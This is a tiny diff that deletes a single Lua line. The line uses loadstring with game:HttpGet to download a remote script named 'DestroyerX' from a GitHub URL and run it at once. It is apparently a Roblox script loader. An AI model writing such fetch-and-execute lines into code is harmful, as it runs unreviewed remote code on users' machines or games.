@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MrRonak2/DestroyerX/main/Script.lua",true))()
